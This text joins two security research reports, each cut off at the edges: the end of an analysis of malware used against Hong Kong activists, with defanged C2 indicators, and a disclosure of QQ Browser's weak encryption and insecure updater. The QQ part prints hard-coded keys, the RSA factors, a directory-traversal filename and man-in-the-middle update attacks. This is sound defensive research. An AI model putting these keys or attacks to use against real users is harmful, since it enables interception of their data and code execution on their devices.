5.\nFigure 5: Network capture of DownLoad connection to the C2.\nUnfortunately, even though the connection with the C2 was established, we did not observe any further activity from this payload. However, DownLoad’s strings show references to the following:\nthis is cmd\nthis is Desktop\nIt is possible these are in reference to additional components or capabilities of the malware. Further analysis is required to determine the function of these components.\nUP007 Command and Control Infrastructure\nThe command and control server for the UP007 sample is hosted on Hong Kong provider New World Telecom at the IP address 59.188.12[.]123. Passive DNS data from PassiveTotal indicates that the domain name yeaton.xicp[.]net pointed to this IP from January 8 2016 to March 19 2016. In their recent report ASERT notes that the domain: yeaton.xicp[.]net was used to advertise a Chinese VPN service in 2012. However, as ASERT explains given the long period between the use of the domain for advertising and the recent threat activity the past uses of the domain may not be related to the threat actors.\nUP007 Samples and Variations\nIn November 2013, an exploit document (MD5: 983333e2c878a62d95747c36748198f0) was uploaded to various malware sites with the filename 中国国家安全委员会机构设置和人员名单提前曝光.docx (which translates to “Chinese National Security Council’s Institutional Structure and Member list”) and 131106 minutes.docx. Instead of receiving the Stage 2 binary in the C2 protocol as in the recent UP007 sample, the November 2013 sample directly requested ok.exe via an HTTP GET request to 103.19.85[.]89. The ok.exe sample communicated with tenday.mysecondarydns[.]com which resolved to 103.19.85[.]89. It was signed with a certificate with serial number 04 DE 6E CB 4B A2 A5 54 2B 5E 0C 71 EE FD 2A AA.\nOne year later, in November 2014, another instance of the UP007 dropper (MD5: e2ac89b5c820fc598b92a635a7d8bc33) signed with a certificate using the serial number 3A 72 A8 34 FB EC E5 4F A5 E5 2F 67 BA 63 4D CA was uploaded to VirusTotal. According to VirusTotal, this file was observed being hosted at http://103.19.85[.]89/chin.jpg. The final payload was designed to communicate with the same host for command and control.\nIn August 2015, an instance of the UP007 dropper (MD5: 639c7239f40d95f677a99abb059e8338) signed with the same certificate (Serial: 5D 11 78 4F B8 17 65 02 3F 89 A4 F4 24 3F E1 A9) as fzyy.exe was uploaded to VirusTotal spotted in the wild as http://hkemail.f3322[.]org/32.zip. This sample communicated with hk2[.]upupdate[.]cn which resolved to 103.27.108[.]122 at the time of analysis.\nThe samples detailed in Table 4 were identified by import hash and other structural similarities related to the UP007 dropper. They were uploaded to VirusTotal by the same submitter on November 14, 2014 and February 27, 2015. They were signed with the same 3A 72...4D CA and 5D 11...E1 A9 certificates, respectively.\n\n\n\nMD5\nImport Hash\nC2\n\n\n21455a5c2496e2603f6ba911fbaaed80\n820438f3f1efede11425a9cc13ae2dbd\nhihihihihahaha.vicp[.]cc (113.204.17[.]59)\n\n\nbe378f3d66ecd38cda09508015de71f7\n820438f3f1efede11425a9cc13ae2dbd\n172.16.10[.]124\n\n\n\nTable 4: UP007 Variants\nThe RAR archive detailed in Table 5 reportedly drops the same files responsible for loading the UP007 sample. It also reportedly communicates with 59.188.12[.]123. We have not been able to obtain this sample directly.\n\n\n\nMD5\nFile Name\nC2\n\n\n19866e7566373028799abd6844ac16d1\nQiHua.rar\n219.133.40[.]1,\n59.188.12[.]123\n\n\n\nTable 5: UP007 Variants \nSLServer Malware Family\nThe SLServer sample we received was also recently analyzed and reported by PwC. It was presented in an overview of threat actors making use of the recent Taiwanese presidential election in email lures to entice targets to open malicious documents. As noted by PwC, this file is a self-extracting archive ultimately responsible for downloading a binary from a website that was likely compromised. Like PwC, we were unable to obtain the final Keyainst.exe binary due to the behaviour of the C2 during the time of analysis.\nBased on common behavioural characteristics and shared C2 it appears the downloaded file analyzed by PwC was MD5: e5e7dcbda781dd0bf5f5da3cccdb094d. This sample was referred to as SunOrcal by PwC. This name was based on a folder misspelling. We refer to the malware family as SLServer due to a resource dialog in the file (see Figure 6).\nFigure 6: SLServer dialog resource.\nAnother recently observed instance of this malware found on VirusTotal (MD5: cfcd2a90e87156e1a811f9c7b0051002) was designed to communicate with the same C2 server and contains the following debug path:\ne:\\Working\\SVNProject\\SLServer\\SLServer2.0\\release\\SLServer.pdb\nInterestingly, according to VirusTotal, the previously mentioned UP007 dropper fzyy.exe was also observed hosted as wthk.txt at the same URL as this downloaded SLServer sample. The precise timeframes during which these samples were hosted and changed remains unknown. Table 6 shows the timestamps of their initial upload to VirusTotal.\n\n\n\nFile Name\nMalware Family\nMD5\nFirst Submission Time\n\n\nwzget.exe\nSLServer\ne5e7dcbda781dd0bf5f5da3cccdb094d\n2016-01-07 19:03:25 UTC\n\n\nfzyy.exe\nUP007\nd579d7a42ff140952da57264614c37bc\n2016-01-08 05:21:18 UTC\n\n\n\nTable 6: Times for Sample Upload to VirusTotal\nSLServer – Possible Second Stage\nThe SLServer sample (MD5: e5e7dcbda781dd0bf5f5da3cccdb094d) calls “FunctionWork” from a DLL:\n\nOn VirusTotal we discovered a file named javaupdata.dll (MD5: 7332245f67b6b8a256ab22a6496b4536), which exports a function by the same name. Strings in the SLServer sample also reference a file by this name. When executed, this DLL contacts 210.61.12[.]153 using SSL. This host is the same one pointed to by the SLServer’s C2 domain, safetyssl.security-centers[.]com. Interestingly, while the 210.61.12[.]153 host did not respond to the SLServer connections during analysis time, the host did accept the SSL connections from javaupdata.dll. Further analysis of this file is ongoing.\nSLServer Command and Control Infrastructure\nThe SLServer C2 server: safetyssl.security-centers[.]com resolved to the IP address: 210.61.12[.]153 at the time of analysis. This IP is hosted in Taiwan on the hosting provider Chunghwa Telecom, specifically their Data Communication Business Group offering. It appears to host the site of a Taiwanese auto parts manufacturer, Yowjung Autoparts. This site may have been either compromised or copied from a legitimate source.\nThe domain name security-centers.com was registered on September 11 2015 by the e-mails: janmiller-domain@googlemail[.]com and an_ardyth@123mail[.]org. Using Passive DNS data we find the following subdomains were used in the time period after domain registration:\nsafetyssl.security-centers[.]com\ncomputer.security-centers[.]com\nsecurity-centers[.]com\nwww.security-centers[.]com\nThe domain computer.security-centers[.]com was a C2 server previously reported by ASERT related to a sample of the Trochilus RAT analyzed in the report. ASERT retrieved that sample from the compromised Myanmar Union Election Commission website. The other subdomains (www and the the top level security-centers[.]com) are likely the default IP addresses for GoDaddy registered domains. The hosting information for this infrastructure is presented in the Figure 7.\nFigure 7: Hosting infrastructure over time for *.security-centers[.]com\nSLServer Samples and Variations\nWe discovered three additional SLServer samples using VirusTotal.  We list the hash, submission time, as well as C2 domains associated with the sample in Table 7.\n\n\n\nMD5\nFirst Submission\nC2\n\n\nd07b2738840ce3419df651d3a0a3a246\n2016-02-25 01:14:15\nwww.olinaodi[.]com\n(74.126.181[.]10)\n\n\n397021af7c0284c28db65297a6711235\n2016-02-22 18:30:19\nsafetyssl.security-centers[.]com\n(210.61.12[.]153)\n\n\ndc195d814ec16fe91690b7e949e696f6\n2016-02-17 11:32:02\nwww.olinaodi[.]com\n(74.126.181[.]10)\n\n\ncfcd2a90e87156e1a811f9c7b0051002\n2015-11-09 05:20:33\nsafetyssl.security-centers[.]com\n(211.255.32[.]130)\n\n\n\nTable 7: SLServer Variants Overview\nRecent Campaign Connections\nIn January 2016, Arbor Networks released a report titled “Uncovering the Seven Pointed Dagger” in which they discuss a series of six RAR files hosted on the Myanmar election commission website on 20 October 2015. The focus of the report was on the discovery of the new Trochilus RAT. However, one of the RAR files was noted as unknown malware. This sample (Security-Patch-Update.exe, MD5: 82896b68314d108141728a4112618304) is also UP007, signed with the 5D 11 78 4F B8 17 65 02 3F 89 A4 F4 24 3F E1 A9 certificate and configured to communicate with 59.188.12[.]123 directly over port 8008, identical to fzyy.exe mentioned above. In this instance, if any of the previously discussed registry keys were present, the sample will execute the dropped runas.exe binary. Given this execution, nvsvc.exe is likely also an older component. As discussed above the UP007 sample we analyzed shares the same C2 (computer.security-centers[.]com) as the Trochilus RAT sample reported by ASERT.\nIn November 2015, Palo Alto Networks reported on a newly discovered trojan referred to as Bookworm. They revealed a campaign focused on the targeting of government entities in Thailand. The campaign used a malware family known as FFRAT, and the sample described in the report connected to the domain hkemail.f3322[.]org for command and control. In August 2015, the same domain was reportedly used to host an instance of UP007 as well.\nFinally, the relationship between the SLServer C2 www.olinaodi[.]com and our previous research into the Surtr malware family was highlighted by PwC through the overlap in the toucan6712@163[.]com registrant. We tracked malware campaigns using the Surtr family that have targeted Tibetan organizations since 2013.\nConclusion\nThis latest espionage campaign against Hong Kong activists appears to be connected to a broader set of targets, and operations. The recent detailed reporting by ASERT makes it clear that the UP007 malware family has been found in previous campaigns targeting Burmese interests. In addition, the campaigns share some C2 infrastructure with previous operations against targets in Thailand and the Tibetan community. The domain registration connections between SLServer infrastructure and Surtr infrastructure also suggests some level of potential coordination between campaigns targeting Hong Kong groups and the Tibetan community. Despite these connections, it is unclear if these campaigns are being conducted by the same threat actor.\nWe cannot exclude the possibility that distinct operators have a degree of sharing of tools and infrastructure. Alternatively, security researcher Ned Moran has articulated a concept of a “digital quartermaster,” to refer to an actor that supplies threat infrastructure and malware development resources to multiple groups. While these scenarios are plausible, we do not have enough data to properly assess these competing hypotheses, or to make conclusive statements about the identity of the threat actors.\nWhat is clear from our analysis is that civil society groups across Asia continue to be targeted by persistent and organized cyber espionage campaigns. Civil society often lack the resources and awareness to defend against these operations and closer attention to the threats they face is needed.\nAcknowledgements\nSpecial thanks to Valkyrie-X Security Research Group and ASERT.

The application offers a number of features beyond those offered by built-in browsers, such as tabbed windows and integration with other chat platforms. \nThis report provides a detailed analysis of how the Windows and Android versions of QQ Browser transmit user data during their operation. This analysis reveals that both versions of QQ Browser transmit a number of personally identifiable user data points either with no encryption or with easily decryptable encryption. We use the phrase “easily decryptable encryption” to refer to the improper implementation of encryption algorithms. For a full discussion, see the “Easily decryptable’ encryption” textbox in our report Baidu’s and Don’ts: Privacy and Security Issues in Baidu Browser.\nThis insecure data transmission means that any in-path actor (such as a user’s ISP, a coffee shop WiFi network, or a malicious actor with network visibility across any of these type of access points) would be able to acquire this personal data by collecting traffic and performing any necessary decryption. \nIn addition to this insecure data transmission, both tested versions of the application perform software updates in a manner that is vulnerable to execution of arbitrary code by an attacker. This means that a malicious actor would be able to spoof a software update in order to install malicious code on a user’s device. \nThis report is a continuation of Citizen Lab research on the privacy and security of mobile applications in Asia. Our previous work includes reports that identified similar concerns with mobile browsers UC Browser and Baidu Browser, which were both found to transmit sensitive user information with either no encryption or easily decryptable encryption. The security issues discovered in UC Browser were also identified in documents leaked by Edward Snowden that indicated the Five Eyes intelligence alliance (NSA, GCHQ, CSE, ASD, and GCSB) had used these vulnerabilities as a means of identifying and tracking users. We have also published a primer on mobile security and privacy, entitled The Many Identifiers in Our Pockets, which provides further background on the types of personal data commonly collected and transmitted by mobile devices. \nIn addition, we have conducted research into keyword censorship and surveillance in TOM-Skype and keyword censorship in messaging platform Sina UC, as well as a comparative analysis of mobile chat applications popular in Asia, including WeChat, LINE and KakaoTalk. We have also examined censorship practices in Tencent’s other flagship application, WeChat. The overall aims of this research are to employ a mixed methods approach, including reverse engineering and other technical analysis methods, to better inform users about the security and privacy risks of the applications they use, and, where relevant, to engage the companies who produce these applications in a process of responsible disclosure to mitigate risks to users.\nOn March 17, 2016 we sent detailed questions to Tencent inquiring about the possible reasons for the collection and insecure transmission of user data to QQ servers. Those questions can be found here. As of the date of publication, we have not received a reply.  At the end of the report, we discuss several possible underlying causes for the strikingly similar issues we found in the three web browsers produced by China-based companies that we have examined.\nQQ Browser Background\nQQ Browser is a web browser for the Android, Windows, OS X, and iOS platforms, developed by Tencent. The Android version of QQ Browser was first released outside of China in November 2011, and a version for the OS X platform was released in March 2012. Alongside competitors such as UC Browser and Baidu Browser, QQ Browser is one of a number of third-party mobile browsers which are particularly popular in Asia. QQ Browser offers a number of features tailored for mobile users, such as image compression to conserve data usage. \nThe app has been very popular, particularly in China, where in January 2013 it was the eighth most-installed application in both the iOS and Android categories. By December 2015, the browser was estimated to have a penetration rate among Chinese mobile browser users of 48.3%. Recent statistics for usage outside of China are difficult to come by, but the application had 16 million non-Chinese users in 2012, with the vast majority based in other countries in Asia.\nTencent is one of China’s largest technology companies, with 2015 revenues exceeding 102 billion RMB (USD$15.8b) and an April 2015 market valuation of USD$206 billion. Amongst its many online offerings, the company has developed two of the world’s most popular instant messaging platforms: WeChat (known in China as 微信, or Weixin) and QQ. Tencent reported that QQ had 853 million monthly active users (MAUs) in 2015, while WeChat/Weixin has 640 million MAUs during the same period. \nTencent’s messaging applications have been the focus of controversy in the past, with China-based dissidents expressing concern that their WeChat communications may have been monitored by Chinese authorities. In response, Tencent stated, “We have taken user data protection seriously in our product development and daily operations, and at the same time, like other international peers, we comply with relevant laws in the countries where we have operations.” \nLike many companies, Tencent has both a Terms of Service and Privacy Policy that describe the types of user data collected by their applications and services and the conditions under which that data can be shared. The English-language version of the Privacy Policy states that “We use a variety of security technologies and procedures for the purpose of preventing loss, misuse, unauthorised access or disclosure of Information. In some of our services, we will use encryption technology (such as SSL) to protect certain sensitive Information provided by you to us.” \n\nIn addition, the Privacy Policy states that “[y]ou agree that we or our affiliate companies may be required to retain, preserve or disclose your Personal Information: (i) in order to comply with applicable laws or regulations; (ii) in order to comply with a court order, subpoena or other legal process; (iii) in response to a request by a government authority, law enforcement agency or similar body (whether situated in your jurisdiction or elsewhere); or (iv) where we believe it is reasonably necessary to comply with applicable laws or regulations.”\nResponsible Disclosure & Notification\nTencent operates a Security Response Center, which describes the process for submitting security vulnerabilities, and the types of vulnerabilities that are considered in scope. On February 5, 2016, we used this site to submit a security vulnerability report to Tencent. We indicated that we would publish our report no sooner than 45 days after notification, in line with international standards on vulnerability disclosure. \nOn or before March 14, 2016, Tencent released version 9.3.6872 of the Windows version of QQ Browser. On March 2, 2016, Tencent released version 6.4.2.2075 of the Android version of the application. We performed an analysis of both updated versions to determine if the issues we identified had been resolved. The results of that analysis are described in the “Update: Analysis of updated versions of QQ Browser” section at the end of this report.\nWe have documented all correspondence with Tencent related to these security issues in an Appendix at the end of this report.\nTechnical Analysis\nWe analyzed version 6.3.0.1920 of the Android version and version 9.2.5478 of the Windows version of QQ browser using a number of tools. We used tcpdump and Wireshark to capture and analyze network traffic, and we used machine code and bytecode disassemblers, decompilers and debuggers, including JD, JADX and IDA, to analyze program behaviour.  \nWe found the browsers communicate back to their servers using a common mechanism that leaks different kinds of personal information, and we found them to have multiple security vulnerabilities in their self-updating processes.\nOur technical analysis is split into three parts. The first part describes a basic structure used by both analyzed versions of QQ Browser to transmit data to QQ servers. The second part contains our analysis of the personal user data transmitted, as well as the software update process, for the Android version of the application. The third part describes our analysis of the same features in the Windows version of the application.\nPart 1: QQ Browser Data Transmission\nBoth the Android and Windows QQ browsers we analyzed communicate with QQ’s servers using something their software refers to internally as a WUP request.  \nWUP Requests\nA WUP request is a binary format that can contain different kinds of values, including integers, floating point numbers, lists, strings, and recursive structures.  These requests are sometimes encrypted before being embedded into the body of an HTTP POST request that is sent to its destined URL.  We wrote python scripts to decrypt and parse these requests into a human-readable format that are available here.  This code also contains all other scripts required to decrypt data that we discuss in this report.\nQ-GUID, Q-UA, and Q-UA2 Fields\nQ-GUID, Q-UA, and Q-UA2 are the names of fields that appear in the HTTP headers of WUP requests.  However, in our description of different WUP requests below, we also use these terms to refer to instances when their respective values additionally appear in the payloads of WUP requests.  In the HTTP header, these fields always appear without encryption, although when they appear in WUP requests their format may vary.\nThe Q-GUID field is populated by a value requested from QQ’s servers via a WUP request at initial startup, and after it is received, it is retained by the browser and included without encryption as an HTTP header in most subsequent requests.  It is also included in the payloads of many WUP requests in different ways.  An example Q-GUID is\ncaed22d728efa6127d53bc0412f888cb\nGUID likely stands for “globally unique identifier,” a kind of 128-bit number used in software that is often generated randomly.\nThe Q-UA and Q-UA2 values include hard-coded information about the version of QQ browser installed and the type of hardware on which it is installed.  Although UA likely stands for “user agent” and contains similar information to an HTTP user agent string, its format is distinct from the user agent HTTP field also included by QQ browser in HTTP headers.\nPart 2: Analysis of QQ Browser – Android Version\nWe analyzed version 6.3.0.1920 of QQ browser for Android, which we downloaded from http://mb.qq.com/.1  We found that after launching and on certain events, such as viewing a page or checking for software updates, the browser sends WUP requests to http://wup.imtt.qq.com:8080/.  When encrypted, these requests are encrypted according to the scheme described below.\nFor each encrypted WUP request, an AES key is generated according to the following Java code:\nint i = 10000000 + new Random().nextInt(89999999);\nint j = 10000000 + new Random().nextInt(89999999);\nreturn (String.valueOf(i) + String.valueOf(j)).getBytes();\nThus, the key is a 128-bit key consisting of 16 ASCII digits.  Moreover, the first and ninth bytes can never be zero and neither the first eight nor the last eight bytes can be all nines, and so the keyspace, instead of normally being size 2128, is only size 899999992 < 253.\nThis key is then used to encrypt the WUP request with AES+ECB.  The AES key is then encrypted with an 128-bit RSA public key with modulus 245406417573740884710047745869965023463 and exponent 65537.  The encrypted AES key is then included in the HTTP request in the qbkey HTTP header.\nRSA is an asymmetric encryption algorithm, meaning that a different, private key is used for decryption, so the above RSA key cannot be immediately used by someone monitoring traffic to decrypt the AES key and thus the WUP request itself.  However, the security of RSA is dependant on the difficulty of the prime factorization of the encryption key’s modulus.  Once factored, the decryption key can be easily recovered.  The above RSA public key is only 128 bits, which is small enough to be easily factored.  (RSA keys are traditionally recommended to be at least 2048 bits.)  We were able to use Wolfram Alpha, an online mathematics engine, to factor the modulus in less than one second:\nhttp://www.wolframalpha.com/input/?i=factor+245406417573740884710047745869965023463\nwhich yielded the following two prime factors:\n14119218591450688427 x 17381019776996486069\nUsing these factors, any man-in-the-middle monitoring traffic can easily decrypt the AES key of every encrypted WUP request and use that AES key to decrypt the request itself.\nWe monitored traffic sent by the browser and used this key to decrypt all of the WUP requests sent by the browser.  We found multiple WUP requests that transmit easily decryptable personal information.  In Figure 1, we show an example of a decrypted WUP request that has been parsed into more readable form by a script that we wrote.\nFigure 1: Example of decrypted WUP request as presented by our tool. Sensitive numbers have been manually replaced with “#” symbols.\nBelow we identify some of the most significant of these requests followed by the personal information that each transmits:\n\n\n\nWUP Request\nTime Observed\nEncryption\n\n\nprofileInfo.profileInfo\nBrowser startup\nEasily decryptable\n\n\nhotword.getAssociationalWords\nTyping into address bar\nNot encrypted\n\n\nSecurity.doSecurityReqest [sic]\nPage view\nEasily decryptable\n\n\nproxyip.getIPListByRouter\nBrowser startup\nEasily decryptable\n\n\npkgcenternew.checkUpdate\nUpdate check\nEasily decryptable\n\n\n\n \n\n\n\nData point\nDescription of data point\nEncryption\nWUP Requests\n\n\nIMEI\nThe International Mobile Equipment Identifier is a string of numbers that is unique for every device.\nEasily decryptable\nprofileInfo.profileInfoSecurity.do\nSecurityReqest\nproxyip.getIPListByRouter\npkgcenternew.checkUpdate\n\n\nIMSI\nThe International Mobile Subscriber Identification number uniquely identifies the user.\nEasily decryptable\nprofileInfo.profileInfo\n\n\nQ-GUID\nUnique string used by QQ Browser to identify a particular user.\nNot encrypted\nhotword.getAssociationalWords\nSecurity.doSecurityReqest\nproxyip.getIPListByRouter\n\n\nQ-UA2\nA value used by QQ Browser that identifies the version of the application used and the type of hardware on which it is installed.\nNot encrypted\nhotword.getAssociationalWords\nSecurity.doSecurityReqest\n\n\nQQ username\nThe user’s QQ username.\nEasily decryptable\nprofileInfo.profileInfo\n\n\nScreen pixel dimensions\nThe dimensions in pixels of a user’s device screen.\nEasily decryptable\nprofileInfo.profileInfo\n\n\nWiFi MAC address\nA Media Access Control address uniquely identifies wireless transmitters like Bluetooth and Wi-Fi chips in the device.\nEasily decryptable\nprofileInfo.profileInfo*\n\n\nIn-range WiFi access point MAC addresses\nThe Media Access Control addresses of all nearby WiFi access points.\nEasily decryptable\nprofileInfo.profileInfo\nproxyip.getIPListByRouter\n\n\nSSID of connected WiFi access point\nThe name of the WiFi access point to which the user is connected.\nEasily decryptable\nproxyip.getIPListByRouter\n\n\nAndroid ID\nA unique number generated when the operating system is first run that can be used to track users.\nEasily decryptable\npkgcenternew.checkUpdate\n\n\nAddress bar contents\nThe contents of the address bar typed in by a user (e.g., a search query).\nNot encrypted\nhotword.getAssociationalWords\n\n\nFull page URL\nThe full URL of each page visited in the browser.\nEasily decryptable\nSecurity.doSecurityReqest\n\n\n\n*Wifi MAC address is encrypted with DES+ECB with key “\\x25\\x92\\x3c\\x7f\\x2a\\xe5\\xef\\x92”\nThe responses to WUP requests were also easily decryptable.  WUP responses were not encrypted using the asymmetric algorithm described earlier but instead used a purely symmetric algorithm, and thus we were not required to factor any key.  Namely, they were encrypted using MTEA+MCBC with the following hard-coded, ASCII-encoded key:\n“sDf434ol*123+-KD”\nInterestingly, this encryption process employed in QQ Browser utilizes the same non-standard MTEA+MCBC implementation we observed in our study of Baidu Browser. (See Figure 4 and accompanying text in our report.)\nSince the algorithm is symmetric, the same key is used to both encrypt and decrypt these responses.  Thus, any man-in-the-middle can use this key to perform an active attack by spoofing the response from QQ servers.  We demonstrate this by attacking QQ browser’s self-updating process.  \nVulnerable software update process\nA pkgcenternew.checkUpdate request, as described earlier, indicates that a software update is available. The response to this request may contain a link to a new APK to download, an MD5 hash of that APK, and a textual description of the changes contained in that update. Android does not allow an APK to upgrade an app if the APK is signed with a different digital signature than that of the currently installed app, and so this attack cannot be used to replace QQ browser with an arbitrary APK; however, it may still be used to install a new app, and a properly crafted APK using the name and logo of QQ browser could be used to deceive a user into installing a malicious APK (see Figure 2).\nFigure 2: Example man-in-the-middle attack on QQ Browser’s updater. On the left, we injected a custom update description. On the right, after the update is downloaded, the browser prompts the user to install the Angry Birds APK (an actual attacker might instead craft an app called “QQ Browser” with an icon similar to that of QQ Browser to further convince the user to install it).\nIt is worthwhile noting that the current unavailability of the Google Play store in China creates the need for Android applications targeting users in China to find alternative methods of updating. Without the option of using the Play store’s software update process, developers are required to implement their own auto-updating mechanism, which as demonstrated in this case can introduce new opportunities for vulnerabilities in an app’s update process. It has been rumoured that a version of the Play store for the Chinese market will be launched in 2016. \nPart 3: Analysis of QQ Browser – Windows Version\nWe analyzed version 9.2.5478 of QQ browser for Windows, which we downloaded from http://browser.qq.com/.  Although the Windows version also communicates with QQ’s servers using WUP requests, it differs from the Android client in how and when communications are encrypted.  Moreover, the Windows version uses the MTEA+MCBC algorithm to encrypt WUP requests, a symmetric encryption algorithm, rather than the asymmetric RSA-based algorithm used by the Android version.  (Encrypted WUP responses use MTEA+MCBC in both the Android and Windows versions.)\nAlthough we observed the Android version sending WUP requests solely to http://wup.imtt.qq.com:8080/, we observed the Windows version sending WUP requests to a variety of URLs including http://qbwup.imtt.qq.com, http://wup.html5.qq.com, and http://wup.imtt.qq.com:8080.\nThe Windows version of the browser also tracks what we henceforth call the machine’s hardware fingerprint, which we found included in many of the WUP requests sent.  The hardware fingerprint is the MD5 hash of the concatenation of the machine’s\n\nNetwork MAC address\nHard drive disk serial number\nHard drive disk model number\nHard drive disk controller version number\n\ne.g.,\nmd5(“080027B09CC2” + “VB7c666e15-ef97c40b” + “VBOX HARDDISK” + “1.0”).\nSince MTEA+MCBC is purely symmetric, any man-in-the-middle observing traffic can use the hard-coded encryption key to easily decrypt all encrypted WUP requests.  As before, we monitored traffic sent by the browser and decrypted all of the WUP requests.  We found multiple WUP requests that leak easily decryptable personal information. We have listed below the most significant of these requests followed by the personal information that they transmit:\n\n\n\nWUP Request\nTime

5th, etc. are the 1st, 2nd, 3rd, etc. bytes of Q-GUID and 2nd, 4th, 6th, etc. bytes of plaintext are randomly chosen.\nWe found that the Windows version also leaked personal information outside of WUP requests when a user visits a page.  We found that the full URLs of every viewed page, whether entered into the address bar or reached via a link or another means, were sent using MTEA+MCBC encryption to http://masterconn.qq.com/ using the key:\n“\\x8a\\x0d\\x75\\x73\\x90\\x03\\x4a\\xd2\\xb5\\x25\\xab\\xe2\\x31\\xe2\\x9f\\x6f”\nVulnerable software update process\nRequests checking for software updates are sent via JSON to http://update.browser.qq.com/qbrowser.  While we found that similar to the Android version both the request for updates and the server’s subsequent response are not encrypted, we found that unlike the Android version the Windows version verifies the digital signature of the downloaded update.  However, we found two attacks against the update process that any man-in-the-middle performing an active attack could still utilize to remotely run code on a QQ Browser user’s machine.\nThe first attack is a type of directory traversal attack.  Normally when an update is available, QQ’s servers respond with the URL of an EXE to download, its MD5 hash, a textual description of the new features and fixes provided by the update, and the filename and location where the EXE will be saved.  We found that the filename is not sanitized to remove directories from its name and so by including directory traversal, an active attacker can overwrite any file to which the user has permission to write.  For instance, by naming the saved file\n../../../../../../../../../program files/tencent/qqbrowser/qqbrowser.exe\nwe overwrote QQ Browser with an arbitrary program that would execute the next time the user attempted to run QQ Browser.  While in our testing the program we overwrote QQ Browser with was a benign program, a malicious attacker could use this attack to install hidden spyware or malware.\nThe second attack demonstrates that checking for digital signatures is in and of itself insufficient for verifying the authenticity of a software update.  A digital signature verifies that the downloaded EXE was written and signed by Tencent, but it does not verify that it will update QQ Browser to a newer version–it could be any EXE that has ever been signed by QQ.  We found an older Web installer for QQ Browser that performs no digital signature checks (itself only using symmetric cryptography), and so on update, we had the user’s QQ Browser “upgrade” to the vulnerable Web installer for QQ Browser, which then proceeded to download and execute an arbitrary EXE of our choosing (see Figure 3).\nFigure 3: Example man-in-the-middle attack on QQ Browser’s self-updater by first injecting a vulnerable Web installer and then injecting our arbitrary program. A benign program that displays “Oh Hai There” was used as the payload, but any arbitrary program such as spyware or malware could be injected.\nDiscussion\nThis report raises a number of serious security issues for QQ Browser users. The application collects and transmits personally identifiable data points in a manner that leaves this data vulnerable to surveillance by third parties. Further, deficiencies in the software update process leave users vulnerable to having arbitrary code, such as a malicious spyware program, inserted by a third party and executed on their devices. Most troubling is the fact that users would generally be unaware of these risks — unaware that such data is being collected and transmitted, and potentially unaware that a properly crafted malicious software update attack could lead to malicious code being installed on their devices.\nHowever, as our previous research has shown, problems of this nature are not unique to any one particular application, operating system, or company. Our analyses of QQ Browser, Baidu Browser, and UC Browser have shown that all three — popular browsers made by three of the biggest tech companies in the world — contain strikingly similar security vulnerabilities. Therefore, QQ Browser is not unique in collecting this sensitive user data and transmitting it either without encryption or with easily decryptable encryption methods.  In light of these similarities, the security concerns raised need to be evaluated through a broader context of mobile and application security generally, rather than focusing on any one particular company or application.\nWeb browsers are trusted to carefully handle sensitive information inputted by users and securely transmit it to Web servers.  However, QQ Browser and the other browsers studied violate this standard of trust by not only collecting sensitive user data themselves, but then also insecurely transmitting it. Even in cases where asymmetric cryptography is used to transmit sensitive user data, it is used inconsistently. The Android version of QQ Browser, which used the asymmetric RSA algorithm, used a key size that was too small to be effective and did not meet the recommended practice of using 2048 bit keys. This shortcoming illustrates the need for developers to use well-tested implementations of well-studied protocols, such as OpenSSL, a widely-used and well-accepted method of transmitting sensitive data in a more secure manner.  \nBeyond the criticism about the methods these applications use to transmit personal data, these findings also raise bigger questions about why such data is being collected and transmitted in the first place. Mobile devices transmit a large range of uniquely revealing identifiers, the collection of which can raise serious privacy and security concerns for users. While these myriad data points available on a user’s device can permit developers to deliver efficient, highly customized services, the breadth of data points collected by these mobile browsers is arguably excessive, and would likely raise concerns among the users of these applications were they aware of it — especially when vendors are unable to properly secure such data.  The collection of such fine-grained information about a user, a user’s device, and a user’s online behavior (and its insecure transmission) would be especially concerning for high-risk users, which in China could include democracy activists, journalists, human rights advocates, lawyers, and others.\nEvaluating underlying causes for the similarities\nThat the three China-based browser applications we have examined all evince strikingly similar data gathering and insecure data handling problems raises an obvious question of whether there is some underlying cause for the similarities.  There are at least four possible explanations, all of which require further research.\n\nThe underlying similarities could simply be the result of coincidence — in other words, no underlying cause.  It is possible that the engineers all settled on the same design choices independently.  However, in the case of QQ Browser and Baidu Browser, where the same non-standard MTEA+MCBC algorithm was found to be used, both companies independently creating exactly the same encryption algorithm is highly unlikely to be a coincidence, and so coincidence seemingly cannot explain our findings entirely.\n\n\nThere could be common engineering norms or industry standards which the browser developers are following, and which are particularly loose in terms of privacy and security with respect to China’s industry.  After all, data overreach — in the form of excessive requested permissions — is a common characteristic of the application sector worldwide.  Targeted advertising is a primary motivation for developing applications, and so it is not surprising to find that there are industry norms and pressures to build in as much functionality to gather up as much information about users as possible — to err on the side of excess, in other words.  It is entirely possible that design choices were made as a result of these industry norms and practices, especially in China, where there is a rapidly expanding and highly dynamic user base for application development.  Developers may not have faced outside pressure to implement strong security protections in their applications, and norms regarding what constitutes private or personally identifiable data may vary or be poorly appreciated. These applications’ lax attention to security, combined with aggressive information gathering, may simply be the product of industry norms, of which the China case is an extreme example at the far end of the spectrum. \n\n\nThere could be directives from the government, or informal pressure coming from state security officials on company executives, and by extension the engineers, to build in a kind of “surveillance by design.”  To be sure, we have no explicit evidence that the government of China directed these specific design choices.  And, the questions we asked the companies about government directives or influence have not been directly answered.  However, we know that China maintains an extensive censorship and surveillance regime and all companies are required by law to follow state regulations in this respect.2 Last year, state-run Xinhua News Agency reported that police officers would be stationed within the country’s major technology companies to fight criminal activity online. The Chinese government has also asked major U.S. tech companies to sign a pledge committing that, amongst other things, its products will be “secure and controllable,” raising fears about legal requirements to implement surveillance backdoors.  There is a strong expectation that China’s information and communications technology sector will responsibly police their networks, as illustrated in Article 19 of China’s Counter-Terrorism Law: “Telecommunications operators and internet service providers shall, according to provisions of law and administrative regulations, put into practice network security systems and information content monitoring systems, technical prevention and safety measures, to avoid the dissemination of information with terrorist or extremist content. Where information with terrorist or extremist content is discovered, its dissemination shall immediately be halted, relevant records shall be saved, and the relevant information deleted, and a report made to public security organs or to relevant departments.”  In such a climate, it is reasonable to hypothesize that company officers put in place wide-reaching data gathering functionalities either at the request of, or to appease the preferences of, China’s security services.  More research is needed to evaluate this hypothesis.\n\n\nFinally, it is possible that the design choices are a subtle combination of points 2 and 3 above.  In other words, a culture of “collect as much as possible” and lax data transmission security reinforce each of the industry’s and government’s needs, but in an unspoken and largely informal way.  In this case, companies and their engineers are following industry norms, which also serve to benefit the interests of government surveillance while complying with the broad spirit of applicable laws. If this were an accurate reading, only when and if industry standards were tightened up by the companies would government authorities feel compelled to intervene and enforce some discipline on them and their engineers (much in the same fashion that Apple has faced pressure from the 